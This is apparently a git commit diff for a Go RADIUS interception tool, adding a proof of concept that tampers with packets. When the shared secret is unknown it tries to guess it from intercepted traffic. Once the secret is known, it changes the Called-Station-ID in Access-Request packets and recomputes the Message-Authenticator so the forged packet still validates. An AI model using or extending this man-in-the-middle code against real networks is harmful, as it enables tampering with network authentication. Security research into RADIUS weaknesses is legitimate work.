4bb3d4c90b480a7f4ad6d375bc0319cc6f9efdd3
famez <f.amez1992@gmail.com>
2019-05-30 13:59:57 +0200

    Added proof of concept to modify attributes

--- main/main.go
+++ main/main.go
@@ -34,17 +34,58 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 	case session.SecretUnknown:
 		fmt.Println("No secret")
 		fmt.Println("Determine secret")
-		session.GuessSecret(*manglePacket, client, server, clientToServer)
+		session.GuessSecret(manglePacket.Clone(), client, server, clientToServer)
 	case session.SecretOk:
 
-		ok, sta := manglePacket.GetCalledSTAID()
+		/*ok, sta := manglePacket.GetCalledSTAID()
 
 		if ok {
 			fmt.Println("Called Sta", sta)
 			sta += "MOD"
 			manglePacket.SetCalledSTAID(sta)
 
+			ok, authMsg := manglePacket.Ge
+
 			//Modify message authenticator attribute
+		}*/
+
+		//Calculate message auth
+
+		if manglePacket.GetCode() == radius.AccessRequest {
+
+			ok, msgAuth := manglePacket.GetMessageAuthenticator()
+
+			if ok {
+
+				//Modify Called STA ID
+
+				ok, sta := manglePacket.GetCalledSTAID()
+
+				if ok {
+
+					fmt.Println("Called STA: ", sta)
+					sta += "-MOD"
+					fmt.Println("Modified STA: ", sta)
+					manglePacket.SetCalledSTAID(sta)
+
+				}
+
+				var unused [16]byte
+
+				fmt.Println("Message Auth: ", msgAuth)
+				ok = radius.RecalculateMsgAuth(manglePacket, unused, context.GetSecret())
+
+				if ok {
+					ok, msgAuth = manglePacket.GetMessageAuthenticator()
+
+					if ok {
+						fmt.Println("Calc Message Auth: ", msgAuth)
+					}
+
+				}
+
+			}
+
 		}
 
 	}
